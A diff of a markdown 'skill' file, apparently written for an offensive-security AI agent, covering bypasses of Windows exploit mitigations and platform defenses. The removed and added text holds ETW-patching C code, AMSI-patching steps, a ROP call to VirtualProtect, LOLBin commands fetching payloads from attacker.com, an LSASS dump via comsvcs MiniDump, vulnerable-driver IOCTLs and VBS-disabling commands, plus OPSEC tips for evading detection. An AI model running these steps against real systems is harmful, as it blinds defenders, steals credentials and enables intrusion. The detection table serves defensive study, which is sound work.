@@ -1,508 +1,107 @@
 ---
 name: windows-mitigations-bypass
-description: Windows exploit mitigation bypass — ASLR, DEP/NX, CFG/XFG, CET/Shadow Stack, SEHOP, ACG, WDAC, ASR, PPL, AMSI, ETW blinding
+description: Bypass Windows exploit & platform mitigations — ASLR/DEP/CFG/XFG/CET, ACG/CIG, WDAC/App Control, ASR/AMSI/ETW, PPL/LSA Protection, BYOVD/VBS/HVCI
 metadata:
   type: offensive
   phase: exploitation
+  tools: [WinDbg, IDA, x64dbg, Process Hacker, ROPgadget, mona.py, PPLmedic, nanodump, EDRSandblast]
+  mitre: [T1211, T1218, T1562.001, T1562.004, T1562.006, T1003.001, T1068, T1620, T1140]
 kill_chain:
-  phase: [exploit]
-  step: [4]
-  attck_tactics: [TA0002, TA0005]
+  phase: [exploit, installation]
+  step: [4, 5]
+  attck_tactics: [TA0002, TA0004, TA0005]
+  attck_techniques: [T1211, T1218, T1562.001, T1562.004, T1562.006, T1003.001, T1068, T1620, T1112]
 depends_on: [exploit-development, reverse-engineering]
-feeds_into: [shellcode-dev, edr-evasion]
-inputs: [mitigation_config, binary_analysis]
-outputs: [bypass_technique, finding_record]
-  ---
+feeds_into: [shellcode-dev, edr-evasion, windows-boundaries]
+inputs: [mitigation_config, binary_analysis, target_os_build]
+outputs: [bypass_technique, finding_record, mitigation_fingerprint]
+references:
+  - references/memory-safety-mitigations.md
+  - references/acg-cig-dynamic-code.md
+  - references/wdac-app-control-bypass.md
+  - references/asr-amsi-etw-blinding.md
+  - references/ppl-lsa-protection.md
+  - references/byovd-vbs-hvci.md
+scripts:
+  - scripts/mitigation_recon.ps1
+  - scripts/Get-ProcessMitigationMap.ps1
+  - scripts/find_nonaslr_modules.py
+  - scripts/cfg_dispatch_gadget_finder.py
+  - scripts/extract_asr_exclusions.py
+  - scripts/check_driver_blocklist.py
+---
 
 # Windows Mitigations & Bypass
 
+Defeating both **exploit mitigations** (ASLR/DEP/CFG/XFG/CET/ACG) and **platform security controls**
+(WDAC, ASR, AMSI/ETW, PPL/LSA Protection, VBS/HVCI). Every technique is paired with detection +
+OPSEC so it doubles as defensive hardening guidance. Assumes an authorized engagement.
+
 ## When to Activate
 
-- Planning exploit mitigation bypass strategies
-- Understanding Windows security architecture depth
-- Researching WDAC/ASR/PPL bypass vectors
-- Fingerprinting target mitigation landscape before exploitation
+- Fingerprinting a target's mitigation landscape before weaponizing an exploit
+- Designing a memory-corruption exploit that must defeat ASLR + DEP + CFG/CET in one chain
+- Bypassing application control (WDAC / App Control for Business) to run unsigned code
+- Disabling or blinding telemetry (ASR, AMSI, ETW) ahead of post-exploitation
+- Dumping a PPL/LSA-protected process (LSASS) or killing a PPL-protected EDR
+- Deciding between userland-only vs BYOVD/kernel approaches based on VBS/HVCI state
 
-## Mitigation Landscape
+## Technique Map
 
-```
-SYSTEM-LEVEL                    PROCESS-LEVEL
-─────────────                   ─────────────
-VBS/HVCI                        DEP/NX
-WDAC/CI                         ASLR (Bottom-up, High Entropy)
-Secure Boot                     CFG/XFG
-Credential Guard                CET/Shadow Stack
-KDP (Kernel Data Protection)    ACG (Arbitrary Code Guard)
-KASLR                           CIG (Code Integrity Guard)
-                                Child Process Policy
-```
+| Technique | ATT&CK | CWE | Reference | Script |
+|-----------|--------|-----|-----------|--------|
+| ASLR/HEASLR defeat (info leak, partial overwrite, non-ASLR module) | T1211 | CWE-330 | references/memory-safety-mitigations.md | scripts/find_nonaslr_modules.py |
+| DEP/NX bypass (ROP→VirtualProtect, ret2libc) | T1211 | CWE-119 | references/memory-safety-mitigations.md | scripts/cfg_dispatch_gadget_finder.py |
+| CFG/XFG bypass (valid-target dispatch gadget, type-hash collision) | T1211 | CWE-1240 | references/memory-safety-mitigations.md | scripts/cfg_dispatch_gadget_finder.py |
+| CET shadow stack / IBT evasion (non-CET process, JOP, exception unwind) | T1211 | CWE-1419 | references/memory-safety-mitigations.md | scripts/Get-ProcessMitigationMap.ps1 |
+| ACG/CIG bypass (signed-code reuse, JIT exemption, cross-process) | T1211, T1055 | CWE-94 | references/acg-cig-dynamic-code.md | scripts/Get-ProcessMitigationMap.ps1 |
+| WDAC / App Control bypass (LOLBin, signed Electron/V8, sideload) | T1218 | CWE-693 | references/wdac-app-control-bypass.md | scripts/mitigation_recon.ps1 |
+| ASR rule bypass (excluded path/process hollow, COM, syscalls) | T1562.001 | CWE-693 | references/asr-amsi-etw-blinding.md | scripts/extract_asr_exclusions.py |
+| AMSI bypass (amsiInitFailed, AmsiScanBuffer patch, hardware bp) | T1562.001 | CWE-693 | references/asr-amsi-etw-blinding.md | scripts/mitigation_recon.ps1 |
+| ETW blinding (EtwEventWrite patch, provider disable, NtTraceControl) | T1562.006 | CWE-778 | references/asr-amsi-etw-blinding.md | scripts/mitigation_recon.ps1 |
+| PPL / LSA Protection bypass (PPLmedic userland chain, BYOVD) | T1003.001, T1562.001 | CWE-269 | references/ppl-lsa-protection.md | scripts/Get-ProcessMitigationMap.ps1 |
+| BYOVD kernel R/W (unblocked driver, EPROCESS.Protection wipe) | T1068, T1562.001 | CWE-822 | references/byovd-vbs-hvci.md | scripts/check_driver_blocklist.py |
+| VBS/HVCI/Credential Guard evasion (blocklist evasion, data-only) | T1068, T1562.001 | CWE-693 | references/byovd-vbs-hvci.md | scripts/check_driver_blocklist.py |
 
-## Recon & Fingerprinting
-
-```c
-// Check system mitigations
-// VBS/HVCI: HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard
-// Credential Guard: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags
-// Secure Boot: HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State
-
-// Check process mitigations
-GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &dep, sizeof(dep));
-GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslr, sizeof(aslr));
-GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));
-GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy, &acg, sizeof(acg));
-```
+## Quick Start
 
 ```powershell
-# PowerShell enumeration
-Get-ProcessMitigation -System
-Get-ProcessMitigation -Name chrome.exe
-# Find weak processes (missing mitigations)
-Get-Process | ForEach-Object { Get-ProcessMitigation -Id $_.Id 2>$null }
+# 1. Fingerprint system + per-process mitigations, AMSI/ETW/ASR/WDAC/VBS state
+powershell -ep bypass -f scripts/mitigation_recon.ps1 -OutJson recon.json
+powershell -ep bypass -f scripts/Get-ProcessMitigationMap.ps1   # rank weak processes
+
+# 2. If memory-corruption target: locate non-ASLR modules + CFG-valid dispatch gadgets
+python scripts/find_nonaslr_modules.py C:\Target\*.dll
+python scripts/cfg_dispatch_gadget_finder.py target.dll        # ROP/JOP under CFG/CET
+
+# 3. If application control (WDAC) blocks execution: pick a signed bypass vessel
+#    MSBuild inline C#, signed legacy Teams (Electron), or signed Node .node module
+
+# 4. Blind telemetry before post-ex (use sparingly — patching is itself an IOC)
+#    AMSI: patch AmsiScanBuffer / amsiInitFailed   ETW: patch EtwEventWrite
+
+# 5. Credential access vs PPL/LSA: userland PPLmedic chain (no driver) or BYOVD
+python scripts/extract_asr_exclusions.py                         # find ASR-excluded paths
+python scripts/check_driver_blocklist.py mydriver.sys           # is driver blocklisted/HVCI-safe?
 ```
 
-## DEP/NX Bypass
-
-**What it does**: Marks stack/heap as non-executable. Code on stack won't run.
-
-**Bypass techniques**:
-- ROP (Return-Oriented Programming) — chain existing code gadgets
-- ret2libc — call VirtualProtect/VirtualAlloc to make region executable
-- JIT spray — abuse JIT compilers that generate executable code
-
-```python
-# ROP to call VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &old)
-from pwn import *
-rop = ROP(elf)
-rop.call('VirtualProtect', [shellcode_addr, 0x1000, 0x40, writable_addr])
-rop.call(shellcode_addr)
-```
-
-## ASLR Bypass
-
-**What it does**: Randomizes base addresses of modules, stack, heap.
-
-**Bypass techniques**:
-- Information leak (format string, partial overwrite, side-channel)
-- Partial overwrite (last 12 bits are fixed — page offset)
-- Non-ASLR modules (legacy DLLs compiled without /DYNAMICBASE)
-- Brute force (32-bit: only 8 bits of entropy for some regions)
-- Heap spray (predictable addresses at high allocations)
-
-```bash
-# Find non-ASLR modules
-# Process Hacker → Module tab → check DllCharacteristics for DYNAMIC_BASE
-# Or: dumpbin /headers module.dll | findstr "Dynamic base"
-```
-
-## CFG (Control Flow Guard) Bypass
-
-**What it does**: Validates indirect call targets against a bitmap of valid targets.
-
-**Bypass techniques**:
-- Call existing valid targets (dispatch gadgets)
-- Corrupt the CFG bitmap (requires write primitive)
-- COOP (Counterfeit Object-Oriented Programming) — chain virtual method calls
-- Target functions not in the bitmap (dynamically generated code)
-- JIT spray to create valid targets
-
-```c
-// CFG validates: call [rax] → is target in bitmap?
-// Bypass: find "universal gadget" that's a valid CFG target
-// Example: longjmp, coroutine dispatch, virtual destructors
-```
-
-## CET / Shadow Stack Bypass
-
-**What it does**: Hardware-enforced return address protection. Shadow stack stores copy of return addresses.
-
-**Bypass techniques**:
-- CET is relatively new — not all processes opt in
-- Signal/exception handler abuse (legitimate stack unwinding)
-- JOP (Jump-Oriented Programming) — avoid RET entirely
-- Overwrite shadow stack via kernel vulnerability
-- Target processes without CET enabled
-
-## ACG (Arbitrary Code Guard) Bypass
-
-**What it does**: Prevents dynamic code generation (no RWX, no VirtualProtect to RX).
-
-**Bypass techniques**:
-- Use existing executable code (ROP/JOP only)
-- Abuse JIT processes that have ACG exceptions
-- Cross-process: inject into process without ACG
-- Abuse shared memory sections mapped as executable
-
-## WDAC (Windows Defender Application Control) Bypass
-
-**What it does**: Only allows execution of signed/approved binaries.
-
-**Bypass techniques**:
-```powershell
-# LOLBins that are WDAC-allowed but can execute arbitrary code:
-# MSBuild.exe — compile and execute inline C#
-MSBuild.exe payload.csproj
-
-# InstallUtil.exe — execute via Uninstall method
-InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
-
-# Regsvr32.exe — scriptlet execution
-regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
-
-# WMIC — XSL script execution
-wmic process list /format:"http://attacker.com/payload.xsl"
-
-# Managed DLL search order hijack in WDAC-allowed apps
-# Find allowed app that loads DLL from writable location
-```
-
-## ASR (Attack Surface Reduction) Bypass
-
-**What it does**: Rules blocking common attack behaviors (Office macros, child processes, credential theft).
-
-**Bypass techniques**:
-```powershell
-# Check active ASR rules
-Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
-
-# Common bypasses:
-# "Block Office from creating child processes" → use COM objects instead
-# "Block credential stealing from LSASS" → use direct syscalls, not API
-# "Block executable content from email" → HTML smuggling
-# "Block JS/VBS from launching executables" → use WMI or COM
-```
-
-## PPL (Protected Process Light) Bypass
-
-**What it does**: Prevents unsigned code from accessing protected processes (LSASS, csrss).
-
-**Bypass techniques**:
-```bash
-# BYOVD: Load vulnerable signed driver to disable PPL
-# Known vulnerable drivers: RTCore64.sys, dbutil_2_3.sys, ene.sys
-# Use driver to:
-# 1. Zero out EPROCESS.Protection field
-# 2. Or: remove kernel callbacks
-
-# PPLdump: exploit PPL-allowed DLL loading
-# Mimikatz driver: mimidrv.sys (if you can load it)
-
-# Alternative: dump LSASS via comsvcs.dll (MiniDump)
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> dump.bin full
-# Note: heavily monitored by EDRs now
-```
-
-## ETW Blinding
-
-```c
-// Patch EtwEventWrite in ntdll (blinds userland ETW consumers)
-// Patch NtTraceEvent for kernel-level (requires driver)
-
-// Userland patch:
-void PatchETW() {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    void* addr = GetProcAddress(ntdll, "EtwEventWrite");
-    DWORD old;
-    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
-    *(BYTE*)addr = 0xC3; // ret
-    VirtualProtect(addr, 1, old, &old);
-}
-
-// Also patch:
-// - EtwEventWriteFull
-// - EtwEventWriteTransfer
-// - NtTraceControl (for disabling providers)
-```
-
-### Selective ETW Patching
-```c
-// Instead of blanket patching, disable specific providers:
-// Microsoft-Windows-PowerShell: {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
-// Microsoft-Windows-DotNETRuntime: {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
-// Microsoft-Antimalware-Scan-Interface: {2A576B87-09A7-520E-C21A-4942F0271D67}
-```
-
-## Credential Guard Bypass
-
-**What it does**: Isolates LSASS secrets in a Hyper-V protected container (VTL1).
-
-**Bypass techniques**:
-- Cannot dump credentials from memory (they're in secure enclave)
-- Alternatives: Kerberos ticket theft (still in VTL0 memory)
-- DCSync (if you have replication rights)
-- Keylogging (capture credentials as typed)
-- DPAPI abuse (user keys still accessible)
-- Over-pass-the-hash with Kerberos tickets
-
-## Mitigation Fingerprint → Attack Strategy
-
-| If Active | Then |
-|-----------|------|
-| HVCI ON | Need signed driver (BYOVD) for kernel access |
-| HVCI OFF | Can load unsigned driver |
-| Credential Guard ON | No LSASS dump — use DCSync/tickets |
-| Credential Guard OFF | Mimikatz works |
-| WDAC ON | LOLBin execution only |
-| WDAC OFF | Direct execution possible |
-| CFG ON | ROP/JOP with valid targets only |
-| ACG ON | No shellcode injection — ROP only |
-| CET ON | No ROP — JOP or find CET-disabled process |
-
-## Advanced: CET/Shadow Stack Deep Dive
-
-### How CET Works
-```
-// Intel CET (Control-flow Enforcement Technology):
-// 1. Shadow Stack: hardware-maintained copy of return addresses
-//    - CALL pushes return addr to both regular stack AND shadow stack
-//    - RET compares: if mismatch → #CP (Control Protection) exception
-//    - Shadow stack is in separate memory, not writable by normal instructions
-//
-// 2. Indirect Branch Tracking (IBT):
-//    - Every indirect JMP/CALL target must begin with ENDBR64 instruction
-//    - If target doesn't start with ENDBR64 → #CP exception
-//    - Marks valid indirect call targets at compile time
-```
-
-### CET Bypass Techniques
-```c
-// 1. Target processes without CET (many legacy apps)
-// Check: GetProcessMitigationPolicy(ProcessUserShadowStackPolicy)
-// Many apps compiled without /CETCOMPAT flag
-
-// 2. JOP (Jump-Oriented Programming) — no RET needed
-// Chain: JMP gadgets ending in JMP [reg]
-// Dispatcher gadget: updates register, JMPs to next gadget
-// Functional gadgets: perform operations, JMP to dispatcher
-//
-// JOP chain structure:
-// dispatcher: mov rax, [rbx]; add rbx, 8; jmp rax
-// gadget1: pop rdi; jmp [dispatch_table]
-// gadget2: mov rsi, rcx; jmp [dispatch_table]
-
-// 3. Signal/Exception handler abuse
-// Legitimate exception unwinding modifies shadow stack
-// Trigger exception → handler gets clean shadow stack entry
-// Use handler to redirect execution
-
-// 4. WRSS instruction (Write Shadow Stack)
-// If attacker has kernel access, can write shadow stack directly
-// WRSS is ring-0 only on most implementations
-// Some configurations allow ring-3 WRSS via XSAVE area
-
-// 5. Shadow stack token corruption
-// Shadow stack stores "tokens" at switch points
-// If you can corrupt a saved token → hijack restore
-```
-
-## Advanced: VBS (Virtualization-Based Security) Attacks
-
-### VBS Architecture
-```
-// VBS creates two "Virtual Trust Levels" using Hyper-V:
-// VTL0 (Normal World): regular OS, applications, kernel
-// VTL1 (Secure World): Secure Kernel, LSASS (Credential Guard), HVCI
-//
-// VTL1 enforces:
-// - Code Integrity (HVCI): only signed code runs in kernel
-// - Credential Guard: isolates secrets from VTL0
-// - KDP: protects kernel data structures
-//
-// Even with kernel access in VTL0, cannot read/write VTL1 memory
-```
-
-### VBS Bypass Approaches
-```c
-// 1. Disable VBS via boot configuration (requires local admin + reboot)
-// bcdedit /set hypervisorlaunchtype off
-// reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0
-// Requires physical access or remote reboot capability
-
-// 2. HVCI bypass via vulnerable signed driver
-// HVCI blocks unsigned kernel code — but signed drivers still load
-// Find driver with arbitrary R/W primitive (BYOVD)
-// Use driver to modify kernel structures without executing unsigned code
-
-// 3. Hypervisor vulnerabilities (rare, high impact)
-// CVE-2021-28476 (Hyper-V vmswitch RCE)
-// CVE-2022-21907 (HTTP.sys → Hyper-V escape)
-// Guest-to-host escape → full system compromise
-
-// 4. Side-channel attacks on VTL1
-// Spectre-class attacks may leak VTL1 secrets to VTL0
-// Requires specific microarchitectural conditions
-// Heavily mitigated by microcode updates
-```
-
-## Advanced: Kernel Exploitation (Windows 11 24H2+)
-
-### Modern Kernel Mitigations
-```
-// kCFG (Kernel Control Flow Guard): validates kernel indirect calls
-// kASLR: kernel base randomization (14+ bits entropy)
-// SMEP: prevents kernel from executing user-mode pages
-// SMAP: prevents kernel from accessing user-mode memory
-// KDP: Kernel Data Protection via VTL1
-// Kernel CET: shadow stacks for kernel mode
-// VBS-based KCFI: kernel code flow integrity via hypervisor
-```
-
-### Kernel Pool Exploitation (Modern)
-```c
-// Post-segment heap (Windows 10 19H1+):
-// Pool allocations use segment heap — different from legacy pool
-// LFH (Low Fragmentation Heap) for small allocations
-// VS (Variable Size) segments for larger allocations
-
-// Exploitation strategy:
-// 1. Spray pool with controlled objects
-// 2. Create holes by freeing specific objects
-// 3. Trigger vulnerability to corrupt adjacent object
-// 4. Use corrupted object for read/write primitive
-
-// Useful objects for pool spray:
-// _WNF_STATE_DATA (controllable size, read/write via WNF APIs)
-// _PIPE_ATTRIBUTE (via NtFsControlFile on named pipes)
-// _TOKEN (via NtDuplicateToken, rich attack surface)
-
-// Pool overflow → arbitrary write primitive:
-// Corrupt _WNF_STATE_DATA.AllocatedSize → OOB read
-// Corrupt _WNF_STATE_DATA.DataSize → OOB write
-// Build R/W primitive → overwrite EPROCESS.Token → SYSTEM
-```
-
-### BYOVD (Bring Your Own Vulnerable Driver)
-```c
-// Load signed vulnerable driver → use its R/W primitives
-// Bypasses HVCI because driver is legitimately signed
-
-// Attack flow:
-// 1. Drop signed vulnerable driver to disk
-// 2. Load via sc create / NtLoadDriver
-// 3. Use IOCTL for arbitrary kernel R/W
-// 4. Overwrite process token → SYSTEM
-// 5. Or: remove kernel callbacks → blind EDR
-
-// Example: RTCore64.sys (MSI Afterburner)
-// IOCTL 0x80002048 — read physical memory
-// IOCTL 0x8000204C — write physical memory
-
-// Detection evasion for BYOVD:
-// - Use uncommon/new vulnerable drivers not yet in blocklists
-// - WDAC driver blocklist: check if driver is blocked
-// - Microsoft maintains revocation list — but enforcement varies
-```
-
-## Advanced: ACG Deep Bypass
-
-### ACG Enforcement Details
-```c
-// ACG (Arbitrary Code Guard) prevents:
-// - VirtualAlloc with PAGE_EXECUTE_*
-// - VirtualProtect changing pages to executable
-// - MapViewOfFile with execute permissions
-// - WriteProcessMemory to executable pages
-
-// What ACG ALLOWS:
-// - Loading signed DLLs (they get execute permission)
-// - JIT processes with special exemption (Edge, Firefox)
-// - Existing executable code (ROP/JOP over signed code)
-
-// Bypass 1: Cross-process injection from non-ACG process
-// Find process without ACG → inject there → attack ACG process from it
-
-// Bypass 2: JIT process exemption
-// Some JIT processes have ACG disabled or exempted
-// v8 (Chrome), SpiderMonkey (Firefox), .NET JIT
-// Inject into JIT process → use JIT to generate executable code
-
-// Bypass 3: Shared memory section
-// Create section with SEC_IMAGE flag (pretend it's a DLL)
-// Map as executable in ACG process
-// Requires the section to pass code integrity checks
-```
-
-## Advanced: WDAC Deep Bypass
-
-### WDAC Policy Analysis
-```powershell
-# Dump active WDAC policy
-Get-CIPolicy -FilePath C:\Windows\System32\CodeIntegrity\SIPolicy.p7b
-
-# Find allowed signers
-# Check for wildcards, overly broad publisher rules
-# Look for: AllowedSigners with Filename rules (can be bypassed)
-
-# Common WDAC bypass paths:
-# 1. Signed Microsoft binaries that execute arbitrary code (LOLBins):
-#    - MSBuild.exe (compiles and runs C# inline)
-#    - cmstp.exe (COM scriptlet execution)
-#    - mshta.exe (HTML application execution)
-#    - dnscmd.exe (DLL loading via ServerLevelPluginDll)
-#    - bginfo.exe (executes VBScript from .bgi files)
-
-# 2. Managed code execution via trusted .NET assemblies:
-#    - Find allowed .NET app → inject into its AppDomain
-#    - Use Assembly.Load to dynamically load from memory
-
-# 3. Script engine bypass:
-#    - wscript/cscript if not blocked → execute JScript/VBScript
-#    - PowerShell Constrained Language Mode bypass via runspace
-```
-
-### DLL Sideloading with WDAC
-```c
-// Find allowed applications that load DLLs from writable locations
-// Process Monitor filter: Result = NAME NOT FOUND, Path contains .dll
-// If allowed app searches for DLL in user-writable path:
-// Place malicious DLL there → allowed app loads it → code execution
-
-// Known sideload targets:
-// Teams (many DLL search order issues)
-// Visual Studio (plugin loading)
-// Various Microsoft Office components
-// Any allowed app with DLL hijack vulnerability
-```
-
-## Advanced: Mitigation Interaction Chains
-
-### CFG + DEP Bypass Chain
-```
-// Scenario: CFG ON, DEP ON, ASLR ON
-
-// Step 1: Info leak → defeat ASLR
-// Use type confusion or UAF to read pointer → calculate module base
-
-// Step 2: Find CFG-valid dispatch gadget
-// CFG bitmap marks valid indirect call targets
-// Find: a valid target that allows arbitrary control flow
-// Examples: longjmp, coroutine resume, virtual destructor, __guard_dispatch_icall_fptr
-
-// Step 3: Use dispatch gadget to call VirtualProtect (DEP bypass)
-// CFG allows the call (valid target)
-// VirtualProtect makes shellcode region executable
-
-// Step 4: Execute shellcode
-// ROP is unnecessary — direct shellcode execution after VirtualProtect
-```
-
-### ACG + CIG Bypass Chain
-```
-// Scenario: ACG ON (no dynamic code), CIG ON (only signed images)
-
-// Step 1: Data-only attack (no code execution needed)
-// Corrupt application data structures to achieve goal
-// Example: modify authentication state variable in memory
-
-// Step 2: If code execution needed → signed code reuse
-// Build JOP/ROP chain using only signed module gadgets
-// No new executable code generated — only existing signed code reused
-
-// Step 3: Cross-process fallback
-// Find process without ACG/CIG (legacy app, helper process)
-// Inject into that process instead
-// Attack target from the un-mitigated process
-
-// Step 4: DLL sideloading (if CIG allows specific publishers)
-// Sign a DLL with an allowed certificate
-// Or find validly-signed DLL with exploitable functionality
-```
+## OPSEC & Detection (summary)
+
+| Technique | Telemetry / IOC | Detection (Sigma / EDR) | OPSEC note |
+|-----------|-----------------|--------------------------|------------|
+| ROP/JOP exploit | crash dumps, WER, #CP/#PF exceptions, RWX alloc | EDR stack-walk on VirtualProtect/VirtualAlloc; CFG/CET #CP telemetry | prefer data-only; reuse signed gadgets; avoid RWX |
+| WDAC LOLBin | 4688 w/ MSBuild/mshta parent, child of office/explorer | Sigma proc_creation_win_lolbin_*; CodeIntegrity 3076/3077 audit | use Microsoft-signed Electron/V8 — looks like normal app |
+| AMSI patch | RWX in amsi.dll, AMSI scan gaps | AMSI bypass detections, mem scan of amsi.dll .text | indirect syscalls; restore bytes; HWBP avoids byte edits |
+| ETW patch | EtwEventWrite first byte = 0xC3/0xCC | ETW-TI sensor; integrity scan of ntdll EtwEventWrite | restore after use; or disable provider not whole API |
+| PPL LSASS dump | handle to lsass w/ VM_READ, MiniDump call, 4656/4663 | Sysmon 10 GrantedAccess 0x1010/0x1410; Defender ASR 9e6c... | userland PPLmedic avoids driver IOC; rename per ASR excl. |
+| BYOVD | Sysmon 6 driver load, svc create reg, unsigned-by-MS driver | Sysmon EID6 + reg EID13; MDE LOLDrivers hash hunt; blocklist | pick driver NOT in MS blocklist/LOLDrivers; HVCI may still block |
+| VBS/HVCI off | bcdedit hypervisorlaunchtype off, DeviceGuard reg writes | reg EID13 on DeviceGuard; boot config change events | requires admin+reboot — loud; data-only attack instead |
+
+## Deep Dives
+
+- **references/memory-safety-mitigations.md** — ASLR/HEASLR, DEP/NX, CFG/XFG, Intel CET shadow stack + IBT, SEHOP: how each works on Win11 24H2 and concrete bypass chains (info leak → dispatch gadget → VirtualProtect).
+- **references/acg-cig-dynamic-code.md** — Arbitrary Code Guard, Code Integrity Guard, Dynamic Code policy: signed-code-only reuse, JIT/browser exemptions, cross-process pivots, SEC_IMAGE section abuse.
+- **references/wdac-app-control-bypass.md** — WDAC / App Control for Business: recommended-block-rule LOLBins, signed Electron (Loki C2) + signed Node `.node`/V8 exploitation, DLL sideloading, allow-list reality check.
+- **references/asr-amsi-etw-blinding.md** — ASR rule bypasses (global exclusion abuse, process hollowing into trusted images), AMSI bypass variants, ETW blinding (full patch vs selective provider disable).
+- **references/ppl-lsa-protection.md** — PPL levels & LSA Protection (RunAsPPL), userland PPLmedic exploit chain, PPLBlade/nanodump dumping, Credential Guard reality, BYOVD PPL kill.
+- **references/byovd-vbs-hvci.md** — BYOVD kernel R/W primitive build, Microsoft driver blocklist + LOLDrivers + HVCI/Secure Boot evasion (Silver Fox amsdk.sys case), VBS/Credential Guard limits, kernel shadow stack.
